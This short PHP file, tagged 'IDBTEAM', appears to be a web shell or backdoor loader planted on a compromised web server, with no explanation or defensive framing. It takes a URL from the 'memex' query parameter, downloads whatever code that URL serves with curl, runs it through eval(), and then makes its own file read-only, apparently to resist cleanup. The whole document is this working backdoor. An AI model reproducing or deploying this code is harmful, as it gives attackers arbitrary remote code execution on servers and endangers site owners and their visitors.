IDBTEAM<?php $ch = curl_init($_GET['memex']); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result = curl_exec($ch);eval('?>'.$result); ?><?php
chmod((__FILE__),0444);